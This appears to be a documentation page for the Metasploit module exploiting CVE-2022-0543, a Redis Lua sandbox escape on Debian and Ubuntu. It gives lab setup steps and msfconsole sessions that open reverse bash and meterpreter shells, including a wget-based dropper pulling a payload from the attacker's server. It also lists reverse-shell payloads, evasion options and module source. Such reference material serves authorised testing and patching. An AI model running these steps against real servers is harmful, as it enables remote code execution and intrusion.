@@ -1,0 +1,755 @@
+Redis Lua Sandbox Escape - Metasploit
+
+This page contains detailed information about how to use the exploit/linux/redis/redis_debian_sandbox_escape metasploit module. For list of all metasploit modules, visit the Metasploit Module Library.
+Table Of Contents
+hide
+
+    Module Overview
+        Module Ranking and Traits
+        Basic Usage
+        Required Options
+    Knowledge Base
+        Vulnerable Application
+            Description
+            Setup
+            Docker
+            Ubuntu 20.04
+        Verification Steps
+        Options
+            LUA_LIB
+            PASSWORD
+        Scenarios
+            Successful exploitation of Redis on Ubuntu 20.04 for reverse bash shell
+            Successful exploitation of Redis on Ubuntu 20.04 for reverse meterpreter
+            Successful exploitation of Redis in Ubuntu Docker for reverse bash shell
+            Failed exploitation due to wrong password
+            Failed exploitation of patched Redis on Debian 11
+            Failed exploitation of not-vulnerable Ubuntu 18.04 i386.
+    Msfconsole Usage
+        Module Options
+        Advanced Options
+        Exploit Targets
+        Compatible Payloads
+        Evasion Options
+    Error Messages
+    Related Pull Requests
+    References
+    See Also
+    Authors
+    Version
+
+Module Overview
+
+Name: Redis Lua Sandbox Escape
+Module: exploit/linux/redis/redis_debian_sandbox_escape
+Source code: modules/exploits/linux/redis/redis_debian_sandbox_escape.rb
+Disclosure date: 2022-02-18
+Last modification time: 2022-04-26 12:34:45 +0000
+Supported architecture(s): cmd, x86, x64
+Supported platform(s): Linux, Unix
+Target service / protocol: -
+Target network port(s): 6379
+List of CVEs: CVE-2022-0543
+
+This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The vulnerability was introduced by Debian and Ubuntu Redis packages that insufficiently sanitized the Lua environment. The maintainers failed to disable the package interface, allowing attackers to load arbitrary libraries. On a typical redis deployment (not docker), this module achieves execution as the redis user. Debian/Ubuntu packages run Redis using systemd with the "MemoryDenyWriteExecute" permission, which limits some of what an attacker can do. For example, staged meterpreter will fail when attempting to use mprotect. As such, stageless meterpreter is the preferred payload. Redis can be configured with authentication or not. This module will work with either configuration (provided you provide the correct authentication details). This vulnerability could theoretically be exploited across a few architectures: i386, arm, ppc, etc. However, the module only supports x86_64, which is likely to be the most popular version.
+Module Ranking and Traits
+
+Module Ranking:
+
+    excellent: The exploit will never crash the service. This is the case for SQL Injection, CMD execution, RFI, LFI, etc. No typical memory corruption exploits should be given this ranking unless there are extraordinary circumstances. More information about ranking can be found here. 
+
+Reliability:
+
+    repeatable-session: The module is expected to get a shell every time it runs.
+
+Stability:
+
+    crash-safe: Module should not crash the service.
+
+Side Effects:
+
+    artifacts-on-disk: Modules leaves a payload or a dropper on the target machine.
+
+Basic Usage
+
+msf > use exploit/linux/redis/redis_debian_sandbox_escape
+msf exploit(redis_debian_sandbox_escape) > exploit
+
+Required Options
+
+    RHOSTS: The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+
+Knowledge Base
+Vulnerable Application
+Description
+
+This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The vulnerability was introduced by Debian and Ubuntu Redis packages that insufficiently sanitized the Lua environment. The maintainers failed to disable the package interface, allowing attackers to load arbitrary libraries.
+
+On a typical redis deployment (not docker), this module achieves execution as the redis user. Debian/Ubuntu packages run Redis using systemd with the "MemoryDenyWriteExecute" permission, which limits some of what an attacker can do. For example, staged meterpreter will fail when attempting to use mprotect. As such, stageless meterpreter is the preferred payload.
+
+Redis can be configured with authentication or not. This module will work with either configuration (provided you provide the correct authentication details). This vulnerability could theoretically be exploited across a few architectures: i386, arm, ppc, etc. However, the module only supports x86_64, which is likely to be the most popular version.
+Setup
+
+I'll explain two setup scenarios. I'll first go through Docker since it's so easy but I don't think it's realistically the most likely deployment. I'll then explain an Ubuntu 20.04 installation.
+Docker
+
+This will deploy an official Ubuntu Redis image. To get a vulnerable image do the following:
+
+    docker pull ubuntu/redis:6.0-21.04_edge
+    docker run -d --name vuln_redis -e TZ=UTC -p 6379:6379 -e REDIS_PASSWORD=mypassword ubuntu/redis:6.0-21.04_edge
+
+The vulnerable Redis will now be on port 6379. Note that this version uses a password.
+
+To deploy a patched version, do the following:
+
+    docker pull ubuntu/redis:latest
+    sudo docker run -d --name fixed_redis -e TZ=UTC -p 6379:6379 -e REDIS_PASSWORD=mypassword ubuntu/redis:latest
+
+Ubuntu 20.04
+
+    sudo apt-get install redis-tools=5:5.0.7-2
+    sudo apt-get install redis-server=5:5.0.7-2
+    sudo nano /etc/redis/redis.conf -> Comment out "bind" and change "protected-mode" to no.
+    sudo service redis restart
+
+Verification Steps
+
+    Follow setup steps above.
+    Do: use exploit/linux/redis/redis_debian_sandbox_escape
+    Do: set RHOST <ip>
+    Do: set LHOST <ip>
+    Do: If needed - set PASSWORD <password>
+    Do: check
+    Verify the remote host is vulnerable.
+    Do: run
+    Verify the module receives a reverse shell
+
+Options
+LUA_LIB
+
+The path to the Lua library to load. The default, /usr/lib/x86_64-linux-gnu/liblua5.1.so.0, appears to be valid for both Ubuntu and Debian but I made it optional in case some edge case crops up that I hadn't considered.
+PASSWORD
+
+The password, if needed, to use with the Redis AUTH command.
+Scenarios
+Successful exploitation of Redis on Ubuntu 20.04 for reverse bash shell
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.22
+RHOST => 10.0.0.22
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
+[+] 10.0.0.22:6379 - The target is vulnerable. Successfully executed the 'id' command.
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run
+
+[*] Started reverse TCP handler on 10.0.0.2:4444 
+[*] 10.0.0.22:6379        - Running automatic check ("set AutoCheck false" to disable)
+[+] 10.0.0.22:6379        - The target is vulnerable. Successfully executed the 'id' command.
+[*] 10.0.0.22:6379        - Executing Unix Command for cmd/unix/reverse_bash
+[+] 10.0.0.22:6379        - Exploit complete!
+[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.22:60844 ) at 2022-04-26 03:17:39 -0700
+
+id
+uid=127(redis) gid=134(redis) groups=134(redis)
+uname -a
+Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+Successful exploitation of Redis on Ubuntu 20.04 for reverse meterpreter
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.22
+RHOST => 10.0.0.22
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set target 1
+target => 1
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run
+
+[*] Started reverse TCP handler on 10.0.0.2:4444 
+[*] 10.0.0.22:6379        - Running automatic check ("set AutoCheck false" to disable)
+[+] 10.0.0.22:6379        - The target is vulnerable. Successfully executed the 'id' command.
+[*] 10.0.0.22:6379        - Executing Linux Dropper for linux/x86/meterpreter_reverse_tcp
+[*] 10.0.0.22:6379        - Using URL: http://10.0.0.2:8080/mBTPVKr7pZVP
+[*] 10.0.0.22:6379        - Client 10.0.0.22 (Wget/1.20.3 (linux-gnu)) requested /mBTPVKr7pZVP
+[*] 10.0.0.22:6379        - Sending payload to 10.0.0.22 (Wget/1.20.3 (linux-gnu))
+[+] 10.0.0.22:6379        - Exploit complete!
+[*] 10.0.0.22:6379        - Command Stager progress - 100.00% done (113/113 bytes)
+[*] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.0.22:60848 ) at 2022-04-26 03:21:22 -0700
+[*] 10.0.0.22:6379        - Server stopped.
+
+meterpreter > shell
+Process 13120 created.
+Channel 1 created.
+id
+uid=127(redis) gid=134(redis) groups=134(redis)
+uname -a
+Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+Successful exploitation of Redis in Ubuntu Docker for reverse bash shell
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 127.0.0.1
+RHOST => 127.0.0.1
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PASSWORD mypassword
+PASSWORD => mypassword
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
+[+] 127.0.0.1:6379 - The target is vulnerable. Successfully executed the 'id' command.
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run
+
+[*] Started reverse TCP handler on 10.0.0.2:4444 
+[*] 127.0.0.1:6379        - Running automatic check ("set AutoCheck false" to disable)
+[+] 127.0.0.1:6379        - The target is vulnerable. Successfully executed the 'id' command.
+[*] 127.0.0.1:6379        - Executing Unix Command for cmd/unix/reverse_bash
+[+] 127.0.0.1:6379        - Exploit complete!
+[*] Command shell session 1 opened (10.0.0.2:4444 -> 172.17.0.2:33148 ) at 2022-04-26 03:23:32 -0700
+
+id
+uid=0(root) gid=0(root) groups=0(root)
+uname -a
+Linux 9c7526769ad1 5.13.0-40-generic #45-Ubuntu SMP Tue Mar 29 14:48:14 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+
+Failed exploitation due to wrong password
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 127.0.0.1
+RHOST => 127.0.0.1
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PASSWORD lolwat
+PASSWORD => lolwat
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
+[*] 127.0.0.1:6379 - Cannot reliably check exploitability. Failed authentication.
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > 
+
+Failed exploitation of patched Redis on Debian 11
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.24
+RHOST => 10.0.0.24
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
+[*] 10.0.0.24:6379 - The target is not exploitable. Could not execute 'id' on the remote target.
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > 
+
+Failed exploitation of not-vulnerable Ubuntu 18.04 i386.
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.25
+RHOST => 10.0.0.25
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
+LHOST => 10.0.0.2
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
+[*] 10.0.0.25:6379 - The target is not exploitable. The reported version is unaffected: 4.0.9
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) >
+
+Go back to menu.
+Msfconsole Usage
+
+Here is how the linux/redis/redis_debian_sandbox_escape exploit module looks in the msfconsole:
+
+msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
+
+[*] Using configured payload cmd/unix/reverse_bash
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show info
+
+       Name: Redis Lua Sandbox Escape
+     Module: exploit/linux/redis/redis_debian_sandbox_escape
+   Platform: Unix, Linux
+       Arch: cmd, x86, x64
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2022-02-18
+
+Provided by:
+  Reginaldo Silva
+  jbaines-r7
+
+Module side effects:
+ artifacts-on-disk
+
+Module stability:
+ crash-safe
+
+Module reliability:
+ repeatable-session
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Unix Command
+  1   Linux Dropper
+
+Check supported:
+  Yes
+
+Basic options:
+  Name       Current Setting                           Required  Description
+  ----       ---------------                           --------  -----------
+  LUA_LIB    /usr/lib/x86_64-linux-gnu/liblua5.1.so.0  yes       LUA library path
+  PASSWORD   mypassword                                no        Redis AUTH password
+  RHOSTS                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Me
+                                                                 tasploit
+  RPORT      6379                                      yes       The target port (TCP)
+  SRVHOST    0.0.0.0                                   yes       The local host or network interface to listen on. This must be an address on the loc
+                                                                 al machine or 0.0.0.0 to listen on all addresses.
+  SRVPORT    8080                                      yes       The local port to listen on.
+  SSLCert                                              no        Path to a custom SSL certificate (default is randomly generated)
+  TARGETURI  /                                         yes       Base path
+  THREADS    1                                         yes       The number of concurrent threads (max one per host)
+  URIPATH                                              no        The URI to use for this exploit (default is random)
+
+Payload information:
+
+Description:
+  This module exploits CVE-2022-0543, a Lua-based Redis sandbox 
+  escape. The vulnerability was introduced by Debian and Ubuntu Redis 
+  packages that insufficiently sanitized the Lua environment. The 
+  maintainers failed to disable the package interface, allowing 
+  attackers to load arbitrary libraries. On a typical `redis` 
+  deployment (not docker), this module achieves execution as the 
+  `redis` user. Debian/Ubuntu packages run Redis using systemd with 
+  the "MemoryDenyWriteExecute" permission, which limits some of what 
+  an attacker can do. For example, staged meterpreter will fail when 
+  attempting to use mprotect. As such, stageless meterpreter is the 
+  preferred payload. Redis can be configured with authentication or 
+  not. This module will work with either configuration (provided you 
+  provide the correct authentication details). This vulnerability 
+  could theoretically be exploited across a few architectures: i386, 
+  arm, ppc, etc. However, the module only supports x86_64, which is 
+  likely to be the most popular version.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2022-0543
+  https://www.lua.org/pil/8.2.html
+  https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
+  https://www.debian.org/security/2022/dsa-5081
+  https://ubuntu.com/security/CVE-2022-0543
+
+Module Options
+
+This is a complete list of options available in the linux/redis/redis_debian_sandbox_escape exploit:
+
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show options
+
+Module options (exploit/linux/redis/redis_debian_sandbox_escape):
+
+   Name       Current Setting                           Required  Description
+   ----       ---------------                           --------  -----------
+   LUA_LIB    /usr/lib/x86_64-linux-gnu/liblua5.1.so.0  yes       LUA library path
+   PASSWORD   mypassword                                no        Redis AUTH password
+   RHOSTS                                               yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-M
+                                                                  etasploit
+   RPORT      6379                                      yes       The target port (TCP)
+   SRVHOST    0.0.0.0                                   yes       The local host or network interface to listen on. This must be an address on the lo
+                                                                  cal machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080                                      yes       The local port to listen on.
+   SSLCert                                              no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                                         yes       Base path
+   THREADS    1                                         yes       The number of concurrent threads (max one per host)
+   URIPATH                                              no        The URI to use for this exploit (default is random)
+
+Payload options (cmd/unix/reverse_bash):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Unix Command
+
+Advanced Options
+
+Here is a complete list of advanced options supported by the linux/redis/redis_debian_sandbox_escape exploit:
+
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show advanced
+
+Module advanced options (exploit/linux/redis/redis_debian_sandbox_escape):
+
+   Name                    Current Setting  Required  Description
+   ----                    ---------------  --------  -----------
+   AutoCheck               true             no        Run check before exploit
+   CHOST                                    no        The local client address
+   CMDSTAGER::DECODER                       no        The decoder stub to use.
+   CMDSTAGER::FLAVOR       auto             no        The CMD Stager to use. (Accepted: auto, wget)
+   CMDSTAGER::SSL          false            no        Use SSL/TLS for supported stagers
+   CMDSTAGER::TEMP                          no        Writable directory for staged files
+   CPORT                                    no        The local client port
+   ConnectTimeout          10               yes       Maximum number of seconds to establish a TCP connection
+   ContextInformationFile                   no        The information file that contains context information
+   DisablePayloadHandler   false            no        Disable the handler code for the selected payload
+   EXE::Custom                              no        Use custom exe instead of automatically generating a payload exe
+   EXE::EICAR              false            no        Generate an EICAR file instead of regular payload exe
+   EXE::FallBack           false            no        Use the default template in case the specified one is missing
+   EXE::Inject             false            no        Set to preserve the original EXE function
+   EXE::OldMethod          false            no        Set to use the substitution EXE generation method.
+   EXE::Path                                no        The directory in which to look for the executable template
+   EXE::Template                            no        The executable template file name.
+   EnableContextEncoding   false            no        Use transient context when encoding payloads
+   ForceExploit            false            no        Override check result
+   ListenerBindAddress                      no        The specific IP address to bind to if different from SRVHOST
+   ListenerBindPort                         no        The port to bind to if different from SRVPORT
+   ListenerComm                             no        The specific communication channel to use for this service
+   MSI::Custom                              no        Use custom msi instead of automatically generating a payload msi
+   MSI::EICAR              false            no        Generate an EICAR file instead of regular payload msi
+   MSI::Path                                no        The directory in which to look for the msi template
+   MSI::Template                            no        The msi template file name
+   MSI::UAC                false            no        Create an MSI with a UAC prompt (elevation to SYSTEM if accepted)
+   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]
+   READ_TIMEOUT            2                yes       Seconds to wait while reading redis responses
+   SSL                     false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCipher                                no        String for SSL cipher - "DHE-RSA-AES256-SHA" or "ADH"
+   SSLCompression          false            no        Enable SSL/TLS-level compression
+   SSLVerifyMode           PEER             no        SSL verification method (Accepted: CLIENT_ONCE, FAIL_IF_NO_PEER_CERT, NONE, PEER)
+   SSLVersion              Auto             yes       Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate) (Accepted: A
+                                                      uto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)
+   SendRobots              false            no        Return a robots.txt file if asked for one
+   ShowProgress            true             yes       Display progress messages during a scan
+   ShowProgressPercent     10               yes       The interval in percent that progress should be shown
+   URIHOST                                  no        Host to use in URI (useful for tunnels)
+   URIPORT                                  no        Port to use in URI (useful for tunnels)
+   VERBOSE                 false            no        Enable detailed status messages
+   WORKSPACE                                no        Specify the workspace for this module
+   WfsDelay                2                no        Additional delay in seconds to wait for a session
+
+Payload advanced options (cmd/unix/reverse_bash):
+
+   Name                        Current Setting  Required  Description
+   ----                        ---------------  --------  -----------
+   AutoRunScript                                no        A script to run automatically on session creation.
+   AutoVerifySession           true             yes       Automatically verify and drop invalid sessions
+   CommandShellCleanupCommand                   no        A command to run before the session is closed
+   CreateSession               true             no        Create a new session for every successful login
+   InitialAutoRunScript                         no        An initial script to run on session creation (before AutoRunScript)
+   ReverseAllowProxy           false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but d
+                                                          irectly to LHOST
+   ReverseListenerBindAddress                   no        The specific IP address to bind to on the local system
+   ReverseListenerBindPort                      no        The port to bind to on the local system if different from LPORT
+   ReverseListenerComm                          no        The specific communication channel to use for this listener
+   ReverseListenerThreaded     false            yes       Handle every connection in a new thread (experimental)
+   StagerRetryCount            10               no        The number of times the stager should retry if the first connect fails
+   StagerRetryWait             5                no        Number of seconds to wait for the stager between reconnect attempts
+   VERBOSE                     false            no        Enable detailed status messages
+   WORKSPACE                                    no        Specify the workspace for this module
+
+Exploit Targets
+
+Here is a list of targets (platforms and systems) which the linux/redis/redis_debian_sandbox_escape module can exploit:
+
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Unix Command
+   1   Linux Dropper
+
+Compatible Payloads
+
+This is a list of possible payloads which can be delivered and executed on the target system using the linux/redis/redis_debian_sandbox_escape exploit:
+
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                                  Disclosure Date  Rank    Check  Description
+   -   ----                                                  ---------------  ----    -----  -----------
+   0   payload/cmd/unix/bind_awk                                              normal  No     Unix Command Shell, Bind TCP (via AWK)
+   1   payload/cmd/unix/bind_busybox_telnetd                                  normal  No     Unix Command Shell, Bind TCP (via BusyBox telnetd)
+   2   payload/cmd/unix/bind_jjs                                              normal  No     Unix Command Shell, Bind TCP (via jjs)
+   3   payload/cmd/unix/bind_lua                                              normal  No     Unix Command Shell, Bind TCP (via Lua)
+   4   payload/cmd/unix/bind_netcat                                           normal  No     Unix Command Shell, Bind TCP (via netcat)
+   5   payload/cmd/unix/bind_netcat_gaping                                    normal  No     Unix Command Shell, Bind TCP (via netcat -e)
+   6   payload/cmd/unix/bind_netcat_gaping_ipv6                               normal  No     Unix Command Shell, Bind TCP (via netcat -e) IPv6
+   7   payload/cmd/unix/bind_nodejs                                           normal  No     Unix Command Shell, Bind TCP (via nodejs)
+   8   payload/cmd/unix/bind_perl                                             normal  No     Unix Command Shell, Bind TCP (via Perl)
+   9   payload/cmd/unix/bind_perl_ipv6                                        normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   10  payload/cmd/unix/bind_r                                                normal  No     Unix Command Shell, Bind TCP (via R)
+   11  payload/cmd/unix/bind_ruby                                             normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   12  payload/cmd/unix/bind_ruby_ipv6                                        normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   13  payload/cmd/unix/bind_socat_udp                                        normal  No     Unix Command Shell, Bind UDP (via socat)
+   14  payload/cmd/unix/bind_stub                                             normal  No     Unix Command Shell, Bind TCP (stub)
+   15  payload/cmd/unix/bind_zsh                                              normal  No     Unix Command Shell, Bind TCP (via Zsh)
+   16  payload/cmd/unix/generic                                               normal  No     Unix Command, Generic Command Execution
+   17  payload/cmd/unix/pingback_bind                                         normal  No     Unix Command Shell, Pingback Bind TCP (via netcat)
+   18  payload/cmd/unix/pingback_reverse                                      normal  No     Unix Command Shell, Pingback Reverse TCP (via netcat)
+   19  payload/cmd/unix/python/meterpreter/bind_tcp                           normal  No     Python Exec, Python Meterpreter, Python Bind TCP Stager
+   20  payload/cmd/unix/python/meterpreter/bind_tcp_uuid                      normal  No     Python Exec, Python Meterpreter, Python Bind TCP Stager with UUID Support
+   21  payload/cmd/unix/python/meterpreter/reverse_http                       normal  No     Python Exec, Python Meterpreter, Python Reverse HTTP Stager
+   22  payload/cmd/unix/python/meterpreter/reverse_https                      normal  No     Python Exec, Python Meterpreter, Python Reverse HTTPS Stager
+   23  payload/cmd/unix/python/meterpreter/reverse_tcp                        normal  No     Python Exec, Python Meterpreter, Python Reverse TCP Stager
+   24  payload/cmd/unix/python/meterpreter/reverse_tcp_ssl                    normal  No     Python Exec, Python Meterpreter, Python Reverse TCP SSL Stager
+   25  payload/cmd/unix/python/meterpreter/reverse_tcp_uuid                   normal  No     Python Exec, Python Meterpreter, Python Reverse TCP Stager with UUID Support
+   26  payload/cmd/unix/python/meterpreter_bind_tcp                           normal  No     Python Exec, Python Meterpreter Shell, Bind TCP Inline
+   27  payload/cmd/unix/python/meterpreter_reverse_http                       normal  No     Python Exec, Python Meterpreter Shell, Reverse HTTP Inline
+   28  payload/cmd/unix/python/meterpreter_reverse_https                      normal  No     Python Exec, Python Meterpreter Shell, Reverse HTTPS Inline
+   29  payload/cmd/unix/python/meterpreter_reverse_tcp                        normal  No     Python Exec, Python Meterpreter Shell, Reverse TCP Inline
+   30  payload/cmd/unix/python/pingback_bind_tcp                              normal  No     Python Exec, Python Pingback, Bind TCP (via python)
+   31  payload/cmd/unix/python/pingback_reverse_tcp                           normal  No     Python Exec, Python Pingback, Reverse TCP (via python)
+   32  payload/cmd/unix/python/shell_bind_tcp                                 normal  No     Python Exec, Command Shell, Bind TCP (via python)
+   33  payload/cmd/unix/python/shell_reverse_tcp                              normal  No     Python Exec, Command Shell, Reverse TCP (via python)
+   34  payload/cmd/unix/python/shell_reverse_tcp_ssl                          normal  No     Python Exec, Command Shell, Reverse TCP SSL (via python)
+   35  payload/cmd/unix/python/shell_reverse_udp                              normal  No     Python Exec, Command Shell, Reverse UDP (via python)
+   36  payload/cmd/unix/reverse                                               normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   37  payload/cmd/unix/reverse_awk                                           normal  No     Unix Command Shell, Reverse TCP (via AWK)
+   38  payload/cmd/unix/reverse_bash                                          normal  No     Unix Command Shell, Reverse TCP (/dev/tcp)
+   39  payload/cmd/unix/reverse_bash_telnet_ssl                               normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   40  payload/cmd/unix/reverse_bash_udp                                      normal  No     Unix Command Shell, Reverse UDP (/dev/udp)
+   41  payload/cmd/unix/reverse_jjs                                           normal  No     Unix Command Shell, Reverse TCP (via jjs)
+   42  payload/cmd/unix/reverse_ksh                                           normal  No     Unix Command Shell, Reverse TCP (via Ksh)
+   43  payload/cmd/unix/reverse_lua                                           normal  No     Unix Command Shell, Reverse TCP (via Lua)
+   44  payload/cmd/unix/reverse_ncat_ssl                                      normal  No     Unix Command Shell, Reverse TCP (via ncat)
+   45  payload/cmd/unix/reverse_netcat                                        normal  No     Unix Command Shell, Reverse TCP (via netcat)
+   46  payload/cmd/unix/reverse_netcat_gaping                                 normal  No     Unix Command Shell, Reverse TCP (via netcat -e)
+   47  payload/cmd/unix/reverse_nodejs                                        normal  No     Unix Command Shell, Reverse TCP (via nodejs)
+   48  payload/cmd/unix/reverse_openssl                                       normal  No     Unix Command Shell, Double Reverse TCP SSL (openssl)
+   49  payload/cmd/unix/reverse_perl                                          normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   50  payload/cmd/unix/reverse_perl_ssl                                      normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   51  payload/cmd/unix/reverse_php_ssl                                       normal  No     Unix Command Shell, Reverse TCP SSL (via php)
+   52  payload/cmd/unix/reverse_python                                        normal  No     Unix Command Shell, Reverse TCP (via Python)
+   53  payload/cmd/unix/reverse_python_ssl                                    normal  No     Unix Command Shell, Reverse TCP SSL (via python)
+   54  payload/cmd/unix/reverse_r                                             normal  No     Unix Command Shell, Reverse TCP (via R)
+   55  payload/cmd/unix/reverse_ruby                                          normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   56  payload/cmd/unix/reverse_ruby_ssl                                      normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   57  payload/cmd/unix/reverse_socat_udp                                     normal  No     Unix Command Shell, Reverse UDP (via socat)
+   58  payload/cmd/unix/reverse_ssh                                           normal  No     Unix Command Shell, Reverse TCP SSH
+   59  payload/cmd/unix/reverse_ssl_double_telnet                             normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+   60  payload/cmd/unix/reverse_stub                                          normal  No     Unix Command Shell, Reverse TCP (stub)
+   61  payload/cmd/unix/reverse_tclsh                                         normal  No     Unix Command Shell, Reverse TCP (via Tclsh)
+   62  payload/cmd/unix/reverse_zsh                                           normal  No     Unix Command Shell, Reverse TCP (via Zsh)
+   63  payload/generic/custom                                                 normal  No     Custom Payload
+   64  payload/generic/shell_bind_tcp                                         normal  No     Generic Command Shell, Bind TCP Inline
+   65  payload/generic/shell_reverse_tcp                                      normal  No     Generic Command Shell, Reverse TCP Inline
+   66  payload/generic/ssh/interact                                           normal  No     Interact with Established SSH Connection
+
+Evasion Options
+
+Here is the full list of possible evasion options supported by the linux/redis/redis_debian_sandbox_escape exploit in order to evade defenses (e.g. Antivirus, EDR, Firewall, NIDS etc.):
+
+msf6 exploit(linux/redis/redis_debian_sandbox_escape) > show evasion
+
+Module evasion options:
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   HTTP::chunked         false            no        Enable chunking of HTTP responses via "Transfer-Encoding: chunked"
+   HTTP::compression     none             no        Enable compression of HTTP responses via content encoding (Accepted: none, gzip, deflate)
+   HTTP::header_folding  false            no        Enable folding of HTTP headers
+   HTTP::junk_headers    false            no        Enable insertion of random junk HTTP headers
+   HTTP::no_cache        false            no        Disallow the browser to cache HTTP content
+   HTTP::server_name     Apache           yes       Configures the Server header of all outgoing replies
+   TCP::max_send_size    0                no        Maxiumum tcp segment size.  (0 = disable)
+   TCP::send_delay       0                no        Delays inserted before every send.  (0 = disable)
+
+Go back to menu.
+Error Messages
+
+This module may fail with the following error messages:
+Error Messages
+
+    Failed authentication.
+    Unaffected operating system
+    redis_git_sha1:00000000
+    Could not extract a version number
+    The reported version is unaffected: <REDIS_VERSION>
+    The reported version is unaffected: <REDIS_VERSION>
+    Unsupported architecture
+    Successfully executed the 'id' command.
+    Could not execute 'id' on the remote target.
+    The server did not respond
+    The server did not respond as expected: <RESP>
+
+Check for the possible causes from the code snippets below found in the module source code. This can often times help in identifying the root cause of the problem.
+Failed authentication.
+
+Here is a relevant code snippet related to the "Failed authentication." error message:
+
+141:	    # 3. redis_git_sha1:00000000
+142:	    #
+143:	    # We could probably fingerprint the build_id as well, but I'm worried I'll overlook at
+144:	    # package somewhere and it's nice to get final verification via exploitation anyway.
+145:	    info_output = redis_command('INFO')
+146:	    return Exploit::CheckCode::Unknown('Failed authentication.') if info_output.nil?
+147:	    return Exploit::CheckCode::Safe('Unaffected operating system') unless info_output.include? 'os:Linux'
+148:	    return Exploit::CheckCode::Safe('Invalid git sha1') unless info_output.include? 'redis_git_sha1:00000000'
+149:	
+150:	    redis_version = info_output[/redis_version:(?<redis_version>\S+)/, :redis_version]
+151:	    return Exploit::CheckCode::Safe('Could not extract a version number') if redis_version.nil?
+
